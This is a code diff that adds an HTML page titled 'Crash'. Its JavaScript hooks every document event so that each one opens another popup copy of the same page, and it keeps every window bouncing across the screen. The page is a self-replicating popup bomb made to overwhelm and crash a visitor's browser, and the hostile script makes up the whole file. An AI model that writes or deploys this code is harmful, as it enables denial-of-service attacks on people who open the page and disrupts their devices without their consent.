@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crash</title>
+  <style>
+    body {
+      margin: 0;
+      overflow: hidden;
+      min-height: 100vh;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    function moveWindow() {
+      let x = 0;
+      let y = 0;
+      let xDirection = 3;
+      let yDirection = 3;
+
+      function animate() {
+        x += 5 * xDirection;
+        y += 5 * yDirection;
+
+        const maxX = screen.width - 200;
+        const maxY = screen.height - 100;
+
+        if (x > maxX || x < 0) {
+          xDirection *= -1;
+        }
+
+        if (y > maxY || y < 0) {
+          yDirection *= -1;
+        }
+
+        window.moveTo(x, y);
+        requestAnimationFrame(animate);
+      }
+
+      animate();
+    }
+
+
+    const events = Object.keys(document.__proto__.__proto__).reduce((arr, event) => {
+  if (event.startsWith('on')) return [...arr, event.substr(2)];
+  return arr;
+}, []);
+
+function handleEvent() {
+  const newPopup = window.open(location.href, '_blank', 'width=200,height=100');
+      newPopup.addEventListener('load', () => {
+        let popupX = Math.floor(Math.random() * screen.width);
+        let popupY = Math.floor(Math.random() * screen.height);
+        let popupXDirection = 3;
+        let popupYDirection = 3;
+
+        function movePopup() {
+          popupX += 5 * popupXDirection;
+          popupY += 5 * popupYDirection;
+
+          const maxX = newPopup.screen.width - 200;
+          const maxY = newPopup.screen.height - 100;
+
+          if (popupX > maxX || popupX < 0) {
+            popupXDirection *= -1;
+          }
+
+          if (popupY > maxY || popupY < 0) {
+            popupYDirection *= -1;
+          }
+
+          newPopup.moveTo(popupX, popupY);
+          requestAnimationFrame(movePopup);
+        }
+
+        movePopup();
+      });
+}
+
+events.forEach(eventType => {
+  document.addEventListener(eventType, handleEvent);
+});
+
+    moveWindow();
+  </script>
+</body>
+</html>
